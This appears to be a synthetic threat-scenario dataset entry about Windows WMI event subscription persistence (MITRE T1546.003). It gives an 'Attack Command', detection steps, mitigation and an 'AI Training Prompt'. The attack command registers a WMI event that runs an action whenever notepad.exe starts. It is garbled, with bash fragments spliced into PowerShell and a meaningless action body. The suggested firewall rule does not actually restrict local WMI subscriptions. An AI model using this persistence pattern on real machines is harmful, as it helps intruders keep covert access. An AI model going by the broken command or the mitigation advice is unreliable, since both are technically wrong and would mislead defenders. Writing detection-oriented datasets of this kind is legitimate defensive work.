---
type: campaign
scenario_id: 100
tactic: Persistence
technique: "T1546.003: Windows Management Instrumentation Event Subscription"
technique_id: T1546.003
tags: [campaign, lotl, persistence]
---

# Creating WMI event subscription to execute payload on process creation.

## Threat Description
Creating WMI event subscription to execute payload on process creation.

## Attack Command
```
powershell -c "$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Register-WmiEvent -Query 'SELECT * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA \"Win32_Process\" AND TargetInstance.Name=\"notepad.exe\"' -Action { I$(echo 'malicious' | base64 -w0) } -Name $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8)"
```

## Detection Logic
Monitor WMI subscriptions: `Get-WmiObject -Namespace root\subscription -Class __EventConsumer | Select-Object Name`; Event ID 5861.

## Mitigation
Restrict WMI subscriptions: `netsh advfirewall firewall add rule name='Block WMI' dir=in action=block service=winmgmt`; Audit WMI events: `wevtutil qe Microsoft-Windows-WMI-Activity/Operational`.

## AI Training Prompt
Train AI to detect WMI event subscriptions for persistence and suggest firewall rules.

## References
- MITRE ATT&CK T1546.003: https://attack.mitre.org/techniques/T1546/003/
- CWE-732: https://cwe.mitre.org/data/definitions/732.html
